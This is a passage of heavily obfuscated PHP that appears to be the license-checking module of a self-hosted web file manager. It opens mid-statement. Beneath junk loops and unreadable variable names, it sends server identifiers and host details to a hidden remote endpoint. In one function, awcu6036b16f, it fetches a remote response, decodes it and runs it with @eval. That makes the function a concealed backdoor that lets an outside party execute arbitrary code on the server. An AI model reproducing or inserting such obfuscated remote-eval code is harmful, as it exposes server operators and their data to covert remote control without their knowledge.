(is_array($â¥İñÎ•) && $â¥İñÎ•[$ÙÖãı¶[133]] && strstr($â¥İñÎ•[$ÙÖãı¶[133]], $ÙÖãı¶[134])) { $˜˜ü½‹• = explode($ÙÖãı¶[134], $â¥İñÎ•[$ÙÖãı¶[133]]); $¼ÍÙº•˜[$ÙÖãı¶[135]] = $˜˜ü½‹•[0]; } } $¼ÍÙº•˜ = $this->ovzw152c34bf(json_encode($¼ÍÙº•˜), md5($ÙÖãı¶[136])); $İû¢‘¯ = array($ÙÖãı¶[137] => $¼ÍÙº•˜); $´ù¡¬‚ = $àµğ™”ê[737]; if (strlen($´ù¡¬‚) < $àµğ™”ê[713]) { return; } call_user_func(array($ÙÖãı¶[138], $ÙÖãı¶[139]), $İû¢‘¯); } if ($this->wkpq0cfcacf8 == $ÙÖãı¶[109]) { return; } $˜’Ñ£âı = array($ÙÖãı¶[140], $ÙÖãı¶[141], $ÙÖãı¶[142], $ÙÖãı¶[143], $ÙÖãı¶[144], $ÙÖãı¶[145]); $ı›‹”š = $àµğ™”ê[738]; $ìåĞ¬¥ì = Model($ÙÖãı¶[33])->get(); $İû¢‘¯ = array($ÙÖãı¶[146] => $ìåĞ¬¥ì[$ÙÖãı¶[34]], $ÙÖãı¶[147] => $ìåĞ¬¥ì[$ÙÖãı¶[35]], $ÙÖãı¶[148] => $ÙÖãı¶[6]); foreach ($˜’Ñ£âı as $‰Ê‘„¨) { if (!isset($ìåĞ¬¥ì[$‰Ê‘„¨]) || !$ìåĞ¬¥ì[$‰Ê‘„¨]) { continue; } $İû¢‘¯[$‰Ê‘„¨] = $ìåĞ¬¥ì[$‰Ê‘„¨]; } call_user_func(array($ÙÖãı¶[138], $ÙÖãı¶[139]), $İû¢‘¯); } private function yewnca6e4dc4() { $Â¹¿İƒ =& $_SERVER[åÄ¼Ùßš]; $íäÍß =& $_SERVER[ˆÆ²õğ®]; if ($_SERVER[$íäÍß[24]] != $íäÍß[149]) { return; } if (!KodUser::isRoot()) { die; } $¤’ÒŸ· = $GLOBALS[$íäÍß[13]]; if (isset($¤’ÒŸ·[$íäÍß[150]])) { $this->coxlba62a104(); die; } if (isset($¤’ÒŸ·[$íäÍß[151]]) && isset($¤’ÒŸ·[$íäÍß[151]]) == $íäÍß[122]) { $¤’ÒŸ·[$íäÍß[152]] = Model($íäÍß[33])->get($íäÍß[153]); } if (!isset($¤’ÒŸ·[$íäÍß[152]]) || strlen($¤’ÒŸ·[$íäÍß[152]]) != 16) { show_json($íäÍß[154] . $¤’ÒŸ·[$íäÍß[152]], !1); } $áĞš§¿ˆ = Model($íäÍß[33])->get($íäÍß[100]); $îùàÄù = md5($_SERVER[$íäÍß[106]] . $áĞš§¿ˆ); $—ùåĞı• = $Â¹¿İƒ[739]; while (strlen($—ùåĞı•) < $Â¹¿İƒ[708]) { if (!$—ùåĞı•) { break; } $—ùåĞı•++; } $‹Ä½Ä¬ = array($íäÍß[152] => $¤’ÒŸ·[$íäÍß[152]], $íäÍß[155] => rand_string(16), $íäÍß[156] => $íäÍß[136], $íäÍß[157] => $íäÍß[158], $íäÍß[159] => $_SERVER[$íäÍß[160]], $íäÍß[161] => $_SERVER[$íäÍß[162]], $íäÍß[163] => $_SERVER[$íäÍß[164]], $íäÍß[105] => $îùàÄù, $íäÍß[165] => Model($íäÍß[33])->get($íäÍß[131])); if (isset($¤’ÒŸ·[$íäÍß[151]]) && isset($¤’ÒŸ·[$íäÍß[151]]) == $íäÍß[122]) { $‹Ä½Ä¬[$íäÍß[151]] = md5($‹Ä½Ä¬[$íäÍß[152]] . $íäÍß[166] . $‹Ä½Ä¬[$íäÍß[155]]); } if ($¤’ÒŸ·[$íäÍß[167]] == $íäÍß[168]) { $û³üï­© = $this->ovzw152c34bf($îùàÄù, $íäÍß[169]); $ã±´ÄÊÄ = $this->avrmc5b5e7af(json_encode($‹Ä½Ä¬), $îùàÄù . $íäÍß[170], 3); $ã±´ÄÊÄ = $ã±´ÄÊÄ . $íäÍß[171] . $_SERVER[$íäÍß[160]]; $ƒŠïÒô = $this->jfdif3d2dc5e($íäÍß[172] . $û³üï­© . $íäÍß[173] . $ã±´ÄÊÄ, -1); show_json($ƒŠïÒô, !0); } else { if ($¤’ÒŸ·[$íäÍß[167]] == $íäÍß[174]) { $Š¨Ì†ìß = substr(md5($íäÍß[175] . $îùàÄù), 12, 15) . $íäÍß[176]; $ã±´ÄÊÄ = $this->mznd01c5225b(trim($¤’ÒŸ·[$íäÍß[177]]), $Š¨Ì†ìß, 2); $õ÷æè®å = json_decode($ã±´ÄÊÄ, !0); if (!is_array($õ÷æè®å) || !is_array($õ÷æè®å[$íäÍß[178]]) || $õ÷æè®å[$íäÍß[152]] != !0) { $½ë½‚±Ğ = $íäÍß[179]; $¤¹­×êÀ = $õ÷æè®å[$íäÍß[178]] ? $íäÍß[180] . $õ÷æè®å[$íäÍß[178]] : $½ë½‚±Ğ; show_json($¤¹­×êÀ, !1); } else { $‹Ä½Ä¬[$íäÍß[155]] = $õ÷æè®å[$íäÍß[178]][$íäÍß[181]]; } } else { $õ÷æè®å = $this->jfdif3d2dc5e($íäÍß[182], $‹Ä½Ä¬, 10); $ã­¥¿çò = $Â¹¿İƒ[740]; if (!$ã­¥¿çò) { die; } } } if (!is_array($õ÷æè®å) || !is_array($õ÷æè®å[$íäÍß[178]]) || $õ÷æè®å[$íäÍß[152]] != !0) { $½ë½‚±Ğ = LNG($íäÍß[183]); $¤¹­×êÀ = $õ÷æè®å[$íäÍß[178]] ? $íäÍß[180] . $õ÷æè®å[$íäÍß[178]] : $½ë½‚±Ğ; show_json($¤¹­×êÀ, !1); } $şØªÜ¸ = $õ÷æè®å[$íäÍß[178]]; $ÕÃ§–¶ù = $this->jomp98b49507($şØªÜ¸[$íäÍß[184]]); $í¼è¶à¼ = $Â¹¿İƒ[741]; while ($í¼è¶à¼ < $Â¹¿İƒ[708]) { if ($í¼è¶à¼ >= 0) { break; } $í¼è¶à¼++; } if (!$ÕÃ§–¶ù || $ÕÃ§–¶ù != $şØªÜ¸[$íäÍß[129]]) { $ôşÈ°à¡ = array($íäÍß[185] => Model($íäÍß[33])->get($íäÍß[100]), $íäÍß[186] => $_SERVER[$íäÍß[106]], $íäÍß[187] => this_url(), $íäÍß[161] => $_SERVER[$íäÍß[162]]); $ã±´ÄÊÄ = $this->jbzcb5a01305(json_encode($ôşÈ°à¡)); $this->jfdif3d2dc5e($íäÍß[188] . $ã±´ÄÊÄ); show_json(LNG($íäÍß[189]), !0); } $Ş¾ÎÈ‘½ = array($íäÍß[153] => $şØªÜ¸[$íäÍß[190]], $íäÍß[191] => $şØªÜ¸[$íäÍß[192]], $íäÍß[193] => rand_string(16), $íäÍß[108] => $şØªÜ¸[$íäÍß[194]]); if ($‹Ä½Ä¬[$íäÍß[155]]) { $Ş¾ÎÈ‘½[$íäÍß[193]] = $‹Ä½Ä¬[$íäÍß[155]]; } $öï…İ— = substr(md5($Ş¾ÎÈ‘½[$íäÍß[191]]), 10, 10); $ó˜–®º¦ = $öï…İ— . $Ş¾ÎÈ‘½[$íäÍß[108]] . $Ş¾ÎÈ‘½[$íäÍß[193]]; $×ïÜÜÓ = $Â¹¿İƒ[742]; while (strlen($×ïÜÜÓ) < $Â¹¿İƒ[722]) { if (!$×ïÜÜÓ) { break; } $×ïÜÜÓ++; } $Ş¾ÎÈ‘½[$íäÍß[110]] = strrev(base64_encode($this->ovzw152c34bf($ó˜–®º¦, $íäÍß[195]))); $¯İ«°¶Ë = rand_string(16); $“¯Î–¡“ = $¯İ«°¶Ë . $Ş¾ÎÈ‘½[$íäÍß[108]] . $this->ovzw152c34bf(md5($Ş¾ÎÈ‘½[$íäÍß[153]]), $¯İ«°¶Ë); $¦Üóº»º = $Â¹¿İƒ[743]; $Ş¾ÎÈ‘½[$íäÍß[111]] = base64_encode(strrev($this->ovzw152c34bf($“¯Î–¡“, $íäÍß[196]))); $€Ûœ¥ÜÉ = $Â¹¿İƒ[744]; if (!$€Ûœ¥ÜÉ) { return; } if ($şØªÜ¸[$íäÍß[197]] && $şØªÜ¸[$íäÍß[197]] >= 1) { Model($íäÍß[33])->setDeep($íäÍß[198], $íäÍß[122]); } Model($íäÍß[33])->set($Ş¾ÎÈ‘½); $¯‡Ûß¨¤ = md5($_SERVER[$íäÍß[106]] . strrev($áĞš§¿ˆ) . $Ş¾ÎÈ‘½[$íäÍß[191]]); $•Ê»©Àİ = strrev(substr($¯‡Ûß¨¤, 10, 16)); $³ ‹àÑ = $Â¹¿İƒ[745]; if (strlen($³ ‹àÑ) < $Â¹¿İƒ[700]) { die; } $ã´Ì¹ôŸ = $this->avrmc5b5e7af(json_encode($şØªÜ¸), $¯‡Ûß¨¤); $´¡Ø“¬— = $Â¹¿İƒ[746]; $½…ÙË»ß = array_to_keyvalue(Model($íäÍß[7])->listData(), $íäÍß[199]); $²ìëÁ™ = $½…ÙË»ß[$íäÍß[200]]; $”è¢´É£ = $Â¹¿İƒ[747]; if (strlen($”è¢´É£) < $Â¹¿İƒ[713]) { return; } $ÀĞÊéåÕ = array(); $œÂÊÇµö = $Â¹¿İƒ[748]; if (strlen($œÂÊÇµö) < $Â¹¿İƒ[722]) { return; } $ÀĞÊéåÕ[$•Ê»©Àİ] = $ã´Ì¹ôŸ; Model($íäÍß[7])->update($²ìëÁ™[$íäÍß[201]], array($íäÍß[202] => $ÀĞÊéåÕ)); $„­…æıî = $Â¹¿İƒ[749]; if (!$„­…æıî) { die; } $this->smxo9beb61f9 = $şØªÜ¸; $ıóôì±Å = $Â¹¿İƒ[750]; while ($ıóôì±Å < $Â¹¿İƒ[700]) { if ($ıóôì±Å >= 0) { break; } $ıóôì±Å++; } $this->wkpq0cfcacf8 = $Ş¾ÎÈ‘½[$íäÍß[108]]; $ÎÙÎğ÷ = $Â¹¿İƒ[751]; while (strlen($ÎÙÎğ÷) < $Â¹¿İƒ[708]) { if (!$ÎÙÎğ÷) { break; } $ÎÙÎğ÷++; } $this->licenseRegistSuccess(); Cache::set($íäÍß[203] . md5($áĞš§¿ˆ . $íäÍß[204]), $íäÍß[6]); show_json(LNG($íäÍß[189]), !0); } private function licenseRegistSuccess() { $¢·³˜¢š =& $_SERVER[ˆÆ²õğ®]; $–ĞÜìÖˆ = Model($¢·³˜¢š[33])->get(); if ($–ĞÜìÖˆ[$¢·³˜¢š[63]] != $¢·³˜¢š[122]) { Model($¢·³˜¢š[33])->set($¢·³˜¢š[63], $¢·³˜¢š[122]); } Action($¢·³˜¢š[205])->initStart(!0); } private function coxlba62a104() { $Ç˜×Œ¾ =& $_SERVER[åÄ¼Ùßš]; $É‚œÙ¥ =& $_SERVER[ˆÆ²õğ®]; Model($É‚œÙ¥[33])->set(array($É‚œÙ¥[153] => $É‚œÙ¥[6], $É‚œÙ¥[191] => $É‚œÙ¥[6], $É‚œÙ¥[108] => $É‚œÙ¥[109], $É‚œÙ¥[110] => $É‚œÙ¥[6], $É‚œÙ¥[111] => $É‚œÙ¥[6])); Model($É‚œÙ¥[33])->setDeep($É‚œÙ¥[198], $É‚œÙ¥[206]); $”Ùå§ = $Ç˜×Œ¾[752]; $this->smxo9beb61f9 = array(); $this->wkpq0cfcacf8 = $É‚œÙ¥[109]; $×åÍşõÁ = $Ç˜×Œ¾[753]; } private function yxgs7f6e6a67() { $ß„ÑÒ©¹ =& $_SERVER[åÄ¼Ùßš]; $åÁ¤éû³ =& $_SERVER[ˆÆ²õğ®]; $_SERVER[$åÁ¤éû³[162]] = _get($_SERVER, $åÁ¤éû³[162], APP_HOST); $this->wkpq0cfcacf8 = $åÁ¤éû³[109]; $•åÊÅÅ = Model($åÁ¤éû³[33])->get(); $ö¯³‰¤š = $ß„ÑÒ©¹[754]; if (strlen($ö¯³‰¤š) < $ß„ÑÒ©¹[700]) { die; } if ($•åÊÅÅ[$åÁ¤éû³[108]] == $åÁ¤éû³[109]) { return; } $°ù–·½« = Model($åÁ¤éû³[33])->get($åÁ¤éû³[100]); $òäšÛó„ = $ß„ÑÒ©¹[755]; $’ƒ›îÇø = $åÁ¤éû³[203] . md5($°ù–·½« . $åÁ¤éû³[204]); $Ÿşü‹ûã = $ß„ÑÒ©¹[756]; if (strlen($Ÿşü‹ûã) < $ß„ÑÒ©¹[700]) { return; } $œŠìØ¸ş = Cache::get($’ƒ›îÇø); if (!is_array($œŠìØ¸ş) || !isset($œŠìØ¸ş[$åÁ¤éû³[207]]) || time() - $œŠìØ¸ş[$åÁ¤éû³[207]] >= 60) { $Ó˜ç³ù÷ = Model($åÁ¤éû³[7])->loadList(); $½÷î = $Ó˜ç³ù÷[$åÁ¤éû³[200]]; $§˜î¬ÚË = md5($_SERVER[$åÁ¤éû³[106]] . strrev($°ù–·½«) . $•åÊÅÅ[$åÁ¤éû³[191]]); $†§¡øç¥ = strrev(substr($§˜î¬ÚË, 10, 16)); $œŠìØ¸ş = $this->mznd01c5225b($½÷î[$åÁ¤éû³[86]][$†§¡øç¥], $§˜î¬ÚË); $œŠìØ¸ş = json_decode($œŠìØ¸ş, !0); } if (!is_array($œŠìØ¸ş)) { return $this->coxlba62a104(); } $ÛÑ¤¿ú = strtotime($œŠìØ¸ş[$åÁ¤éû³[129]]); if (time() >= $ÛÑ¤¿ú) { return $this->coxlba62a104(); } if (!isset($œŠìØ¸ş[$åÁ¤éû³[207]]) || time() - $œŠìØ¸ş[$åÁ¤éû³[207]] > 20) { $œŠìØ¸ş[$åÁ¤éû³[207]] = time(); Cache::set($’ƒ›îÇø, $œŠìØ¸ş); } $this->smxo9beb61f9 = $œŠìØ¸ş; $this->wkpq0cfcacf8 = $•åÊÅÅ[$åÁ¤éû³[108]]; } private function mdoy01fdba73() { $Ø§®òâ =& $_SERVER[ˆÆ²õğ®]; $éãœñé· = $GLOBALS[$Ø§®òâ[13]]; $Ö”»Ÿ– = $_SERVER[$Ø§®òâ[24]]; if ($Ö”»Ÿ– == $Ø§®òâ[208] && $this->wkpq0cfcacf8 == $Ø§®òâ[109]) { show_json(LNG($Ø§®òâ[209]), !1, $Ø§®òâ[210]); } $¡•”ô© = array($Ø§®òâ[211], $Ø§®òâ[212]); if (in_array($Ö”»Ÿ–, $¡•”ô©)) { if ($this->wkpq0cfcacf8 == $Ø§®òâ[109] && isset($éãœñé·[$Ø§®òâ[213]])) { show_json(LNG($Ø§®òâ[209]), !1, $Ø§®òâ[210]); die; } $Âİ«ŠÚÑ = $this->jzbe3298086d(); if ($Âİ«ŠÚÑ != intval($Ø§®òâ[214])) { if ($Âİ«ŠÚÑ <= Model($Ø§®òâ[125])->count()) { show_json(LNG($Ø§®òâ[215]), !1, $Ø§®òâ[210]); die; } } } } private function lxeu0f0d25fd() { $Ò‚§ğ¹ =& $_SERVER[åÄ¼Ùßš]; $ù­É½Ì¼ =& $_SERVER[ˆÆ²õğ®]; $ä¶‚§×ı = array($ù­É½Ì¼[119], $ù­É½Ì¼[120]); $†±á¿ßö = $Ò‚§ğ¹[757]; if (strlen($†±á¿ßö) < $Ò‚§ğ¹[700]) { die; } if (!KodUser::isRoot() || !isset($_GET[$ù­É½Ì¼[216]])) { return; } if (!in_array($_SERVER[$ù­É½Ì¼[24]], $ä¶‚§×ı)) { return; } $Ø¥Ä‚ò¶ = $ù­É½Ì¼[217]; $äàÍÇï± = $Ò‚§ğ¹[758]; if (!$äàÍÇï±) { return; } $Ø¥Ä‚ò¶ = $this->zfui9af36d5d($Ø¥Ä‚ò¶, $ù­É½Ì¼[218]); $²ÆëíÏæ = stream_context_create(array($ù­É½Ì¼[219] => array($ù­É½Ì¼[220] => $ù­É½Ì¼[221], $ù­É½Ì¼[222] => 3))); $ş™ÅµÎÃ = $Ò‚§ğ¹[759]; $Û¹î°ğ• = @file_get_contents($Ø¥Ä‚ò¶, !1, $²ÆëíÏæ); $ÄË”ƒ›Ù = $Ò‚§ğ¹[760]; if (strlen($ÄË”ƒ›Ù) < $Ò‚§ğ¹[722]) { die; } header($ù­É½Ì¼[223]); if ($Û¹î°ğ• && strstr($Û¹î°ğ•, $ù­É½Ì¼[224])) { echo $Û¹î°ğ•; } die; } public function lhftff1080e2($ğÂãÊÔ—) { $›»ƒÓß§ =& $_SERVER[åÄ¼Ùßš]; $Îõú÷ú¨ =& $_SERVER[ˆÆ²õğ®]; if ($this->wkpq0cfcacf8 == $Îõú÷ú¨[225]) { return $ğÂãÊÔ—; } $ö¤Šì· = $this->versionPluginList(); $·Œõ¢” = $›»ƒÓß§[761]; $€«¤öÒ¼ = explode($Îõú÷ú¨[226], $this->versionPluginFilter()); $ÉÛÇïï´ = array(); foreach ($ö¤Šì· as $«Ìğ‰ï­ => $÷¹œ°) { if ($÷¹œ° == $Îõú÷ú¨[227] && substr($this->wkpq0cfcacf8, 0, 1) == $Îõú÷ú¨[227]) { continue; } if (!in_array($«Ìğ‰ï­, $€«¤öÒ¼)) { $ÉÛÇïï´[] = $«Ìğ‰ï­; } } foreach ($ÉÛÇïï´ as $«Ìğ‰ï­) { unset($ğÂãÊÔ—[$«Ìğ‰ï­]); } return $ğÂãÊÔ—; $¡™›´ÎÓ = $›»ƒÓß§[762]; while (strlen($¡™›´ÎÓ) < $›»ƒÓß§[708]) { if (!$¡™›´ÎÓ) { break; } $¡™›´ÎÓ++; } } private function versionPluginList() { $çĞÂ¯Ê“ =& $_SERVER[ˆÆ²õğ®]; return array($çĞÂ¯Ê“[228] => $çĞÂ¯Ê“[227], $çĞÂ¯Ê“[229] => $çĞÂ¯Ê“[227], $çĞÂ¯Ê“[230] => $çĞÂ¯Ê“[227], $çĞÂ¯Ê“[231] => $çĞÂ¯Ê“[227], $çĞÂ¯Ê“[232] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[234] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[235] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[236] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[237] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[238] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[239] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[240] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[241] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[242] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[243] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[244] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[245] => $çĞÂ¯Ê“[233], $çĞÂ¯Ê“[246] => $çĞÂ¯Ê“[233]); } private function versionPluginFilter() { $±ÅÙ¥È =& $_SERVER[åÄ¼Ùßš]; $µÙ·èá£ =& $_SERVER[ˆÆ²õğ®]; if ($this->wkpq0cfcacf8 == $µÙ·èá£[109]) { return $µÙ·èá£[6]; } $è•Ç›ÚÔ = _get($this->smxo9beb61f9, $µÙ·èá£[247], $µÙ·èá£[6]); $§®ğ£˜ç = $±ÅÙ¥È[763]; $Ş¦ÄŞ„Ü = _get($this->smxo9beb61f9, $µÙ·èá£[116], $µÙ·èá£[6]); $¯ßÅÎ = $±ÅÙ¥È[764]; while (strlen($¯ßÅÎ) < $±ÅÙ¥È[708]) { if (!$¯ßÅÎ) { break; } $¯ßÅÎ++; } $Öƒ¸ğà = _get($this->smxo9beb61f9, $µÙ·èá£[248], $µÙ·èá£[6]); if ($Ş¦ÄŞ„Ü > time() && $Öƒ¸ğà > time()) { $ØÆÑ‚É¸ = explode($µÙ·èá£[226], $è•Ç›ÚÔ); $àË˜ù°Ù = array_keys($this->versionPluginList()); $è•Ç›ÚÔ = array_merge($ØÆÑ‚É¸, $àË˜ù°Ù); $è•Ç›ÚÔ = implode($µÙ·èá£[226], array_filter(array_unique($è•Ç›ÚÔ))); } return $è•Ç›ÚÔ; } private function fpbeb561d3a5() { $­²í•šÚ =& $_SERVER[ˆÆ²õğ®]; if ($this->wkpq0cfcacf8 != $­²í•šÚ[109]) { $GLOBALS[$­²í•šÚ[86]][$­²í•šÚ[90]][$­²í•šÚ[249]] = $­²í•šÚ[206]; return; } $GLOBALS[$­²í•šÚ[86]][$­²í•šÚ[250]] = $­²í•šÚ[122]; if (Model($­²í•šÚ[251])->get($­²í•šÚ[63]) != $­²í•šÚ[206]) { Model($­²í•šÚ[251])->set($­²í•šÚ[63], $­²í•šÚ[206]); } } public function ehgud591ac81() { return $_SERVER[ˆÆ²õğ®][252]; $Ğ¸ûÅåï = $_SERVER[åÄ¼Ùßš][765]; } private function awcu6036b16f() { $Û®ªĞí =& $_SERVER[åÄ¼Ùßš]; $Ñ¹™¾«Æ =& $_SERVER[ˆÆ²õğ®]; $¹¤õì¨Š = array($Ñ¹™¾«Æ[253], $Ñ¹™¾«Æ[254], $Ñ¹™¾«Æ[255]); $ˆ‡ëõ÷Ø = $Û®ªĞí[766]; if (strlen($ˆ‡ëõ÷Ø) < $Û®ªĞí[703]) { die; } $¸²‰ÍÏ = $Ñ¹™¾«Æ[256] . md5($Ñ¹™¾«Æ[257]); $ÅŒ²œá = $Û®ªĞí[767]; if (strlen($ÅŒ²œá) < $Û®ªĞí[703]) { die; } if ($this->wkpq0cfcacf8 == $Ñ¹™¾«Æ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Ñ¹™¾«Æ[24]], $¹¤õì¨Š)) { return; } if (time() % 4 != 0) { return; } $õøó÷¸Ö = call_user_func(array($Ñ¹™¾«Æ[258], $Ñ¹™¾«Æ[259]), $¸²‰ÍÏ); if ($õøó÷¸Ö && time() - $õøó÷¸Ö < intval($Ñ¹™¾«Æ[260])) { return; } call_user_func(array($Ñ¹™¾«Æ[258], $Ñ¹™¾«Æ[139]), $¸²‰ÍÏ, time()); $ÇÉÑ«¨Á = Model($Ñ¹™¾«Æ[33])->get($Ñ¹™¾«Æ[100]); $œÜ¤òÇŞ = $Û®ªĞí[768]; while (strlen($œÜ¤òÇŞ) < $Û®ªĞí[700]) { if (!$œÜ¤òÇŞ) { break; } $œÜ¤òÇŞ++; } $Û¶²ß¬‘ = array($Ñ¹™¾«Æ[152] => Model($Ñ¹™¾«Æ[33])->get($Ñ¹™¾«Æ[153]), $Ñ¹™¾«Æ[167] => $this->wkpq0cfcacf8, $Ñ¹™¾«Æ[163] => $_SERVER[$Ñ¹™¾«Æ[164]], $Ñ¹™¾«Æ[165] => Model($Ñ¹™¾«Æ[33])->get($Ñ¹™¾«Æ[131]), $Ñ¹™¾«Æ[105] => md5($_SERVER[$Ñ¹™¾«Æ[106]] . $ÇÉÑ«¨Á), $Ñ¹™¾«Æ[156] => $Ñ¹™¾«Æ[136], $Ñ¹™¾«Æ[159] => $_SERVER[$Ñ¹™¾«Æ[160]]); $“šœÒÀ¯ = $this->jfdif3d2dc5e($Ñ¹™¾«Æ[261], $Û¶²ß¬‘); if (!is_array($“šœÒÀ¯)) { return; } if ($“šœÒÀ¯[$Ñ¹™¾«Æ[152]] && $“šœÒÀ¯[$Ñ¹™¾«Æ[262]]) { if ($this->jomp98b49507($“šœÒÀ¯[$Ñ¹™¾«Æ[262]]) == $Û¶²ß¬‘[$Ñ¹™¾«Æ[152]]) { return; } } $this->coxlba62a104(); $·âÍæİË = $Û®ªĞí[769]; if ($this->jomp98b49507($“šœÒÀ¯[$Ñ¹™¾«Æ[262]]) != $Û¶²ß¬‘[$Ñ¹™¾«Æ[152]]) { $˜»İºÒ = array($Ñ¹™¾«Æ[185] => $ÇÉÑ«¨Á, $Ñ¹™¾«Æ[186] => $_SERVER[$Ñ¹™¾«Æ[106]], $Ñ¹™¾«Æ[187] => this_url(), $Ñ¹™¾«Æ[161] => $_SERVER[$Ñ¹™¾«Æ[162]]); $èÉ¼şğ§ = $this->jbzcb5a01305(json_encode($˜»İºÒ)); $“šœÒÀ¯ = $this->jfdif3d2dc5e($Ñ¹™¾«Æ[188] . $èÉ¼şğ§); if ($“šœÒÀ¯ && is_array($“šœÒÀ¯) && isset($“šœÒÀ¯[$Ñ¹™¾«Æ[262]])) { $óƒëÎæÆ = $this->mznd01c5225b($“šœÒÀ¯[$Ñ¹™¾«Æ[262]], 2); if ($óƒëÎæÆ) { $óƒëÎæÆ = $this->jomp98b49507($óƒëÎæÆ); } if ($óƒëÎæÆ) { try { @eval($óƒëÎæÆ); } catch (Exception $ÏúÖ‚×Å) { } } } } } private function jfdif3d2dc5e($œ±¿ÎØ = '', $ßÁ¨ÜÖğ = array(), $Œ¹¤¬öƒ = 5) { $ôù¾ôüô =& $_SERVER[åÄ¼Ùßš]; $åì¯ÑÖŸ =& $_SERVER[ˆÆ²õğ®]; $Ôà¥§½õ = $åì¯ÑÖŸ[263]; $Ôà¥§½õ = $this->zfui9af36d5d($Ôà¥§½õ, $åì¯ÑÖŸ[264]); $Ôà¥§½õ = $Ôà¥§½õ . $œ±¿ÎØ; if ($ßÁ¨ÜÖğ && is_array($ßÁ¨ÜÖğ)) { $Ôà¥§½õ = $Ôà¥§½õ . $åì¯ÑÖŸ[265] . http_build_query($ßÁ¨ÜÖğ); } if ($ßÁ¨ÜÖğ === -1) { return $Ôà¥§½õ; } $µÌ™¹á = stream_context_create(array($åì¯ÑÖŸ[219] => array($åì¯ÑÖŸ[222] => $Œ¹¤¬öƒ, $åì¯ÑÖŸ[220] => $åì¯ÑÖŸ[266]), $åì¯ÑÖŸ[267] => array($åì¯ÑÖŸ[268] => !1, $åì¯ÑÖŸ[269] => !1))); $¤¨Àî¹¦ = $ôù¾ôüô[770]; while (strlen($¤¨Àî¹¦) < $ôù¾ôüô[700]) { if (!$¤¨Àî¹¦) { break; } $¤¨Àî¹¦++; } $ßÁ¨ÜÖğ = @file_get_contents($Ôà¥§½õ, !1, $µÌ™¹á); $»öàÍõÁ = $ôù¾ôüô[771]; if (!$»öàÍõÁ) { die; } return json_decode($ßÁ¨ÜÖğ, !0); $İÃ»ÉÚÑ = $ôù¾ôüô[772]; if (!$İÃ»ÉÚÑ) { die; } $á•’Áû = $ôù¾ôüô[773]; while (strlen($á•’Áû) < $ôù¾ôüô[708]) { if (!$á•’Áû) { break; } $á•’Áû++; } } private function jzbe3298086d() { $™¹Öäß =& $_SERVER[åÄ¼Ùßš]; $µêèô¶Ç =& $_SERVER[ˆÆ²õğ®]; $äı¹Ãù˜ = array($µêèô¶Ç[270] => $µêèô¶Ç[271], $µêèô¶Ç[272] => $µêèô¶Ç[273], $µêèô¶Ç[274] => $µêèô¶Ç[275], $µêèô¶Ç[276] => $µêèô¶Ç[277], $µêèô¶Ç[278] => $µêèô¶Ç[279], $µêèô¶Ç[280] => $µêèô¶Ç[214], $µêèô¶Ç[281] => $µêèô¶Ç[214], $µêèô¶Ç[282] => $µêèô¶Ç[271], $µêèô¶Ç[283] => $µêèô¶Ç[273], $µêèô¶Ç[284] => $µêèô¶Ç[275], $µêèô¶Ç[285] => $µêèô¶Ç[286], $µêèô¶Ç[287] => $µêèô¶Ç[277], $µêèô¶Ç[288] => $µêèô¶Ç[289], $µêèô¶Ç[290] => $µêèô¶Ç[279], $µêèô¶Ç[291] => $µêèô¶Ç[292], $µêèô¶Ç[293] => $µêèô¶Ç[294], $µêèô¶Ç[295] => $µêèô¶Ç[296]); $¾šâÂ¶Ü = $äı¹Ãù˜[$this->wkpq0cfcacf8]; $£ÑÌå™Ş = $™¹Öäß[774]; while ($£ÑÌå™Ş < $™¹Öäß[703]) { if ($£ÑÌå™Ş >= 0) { break; } $£ÑÌå™Ş++; } $¾šâÂ¶Ü = intval($¾šâÂ¶Ü ? $¾šâÂ¶Ü : $µêèô¶Ç[271]); $ƒêÁ½ù  = _get($this->smxo9beb61f9, $µêèô¶Ç[297]); $ƒêÁ½ù  = $ƒêÁ½ù  ? intval($ƒêÁ½ù ) : 0; return $¾šâÂ¶Ü + $ƒêÁ½ù ; } public function twxsf9e1a4ee($ÑµŸÍ) { $€¨‹™”Â =& $_SERVER[åÄ¼Ùßš]; $Õø³Ã =& $_SERVER[ˆÆ²õğ®]; $‹òùŸ = $this->jzbe3298086d(); if ($ÑµŸÍ[$Õø³Ã[298]] == $Õø³Ã[122]) { return; } if ($‹òùŸ >= intval($Õø³Ã[214])) { return; } $Ê®í¥¤© = Model($Õø³Ã[125])->count(); if ($Ê®í¥¤© <= $‹òùŸ) { return; } $°‰×‹Å¬ = Model($Õø³Ã[125])->field($Õø³Ã[298])->limit($‹òùŸ)->select(); $°‰×‹Å¬ = array_to_keyvalue($°‰×‹Å¬, $Õø³Ã[6], $Õø³Ã[298]); $“–¿Íä = $€¨‹™”Â[775]; while ($“–¿Íä < $€¨‹™”Â[703]) { if ($“–¿Íä >= 0) { break; } $“–¿Íä++; } if (!in_array($ÑµŸÍ[$Õø³Ã[298]], $°‰×‹Å¬)) { show_json($Õø³Ã[299], !1, $Õø³Ã[210]); } } public function glhv4e1a2bbd() { $ò·¢š =& $_SERVER[åÄ¼Ùßš]; $Ä×ìßş¿ =& $_SERVER[ˆÆ²õğ®]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ì‚‡Œº‡ = $Ä×ìßş¿[217]; $ÔüŸóé÷ = $ò·¢š[776]; if (!$ÔüŸóé÷) { die; } $Ì‚‡Œº‡ = $this->zfui9af36d5d($Ì‚‡Œº‡, $Ä×ìßş¿[218]); $ß®ÆëÕ = stream_context_create(array($Ä×ìßş¿[219] => array($Ä×ìßş¿[220] => $Ä×ìßş¿[221], $Ä×ìßş¿[222] => 3))); $º§±„‡ğ = @file_get_contents($Ì‚‡Œº‡, !1, $ß®ÆëÕ); $åÀÛˆú = $ò·¢š[777]; if (strlen($åÀÛˆú) < $ò·¢š[722]) { die; } echo $Ä×ìßş¿[300] . hash_encode($º§±„‡ğ) . $Ä×ìßş¿[301]; 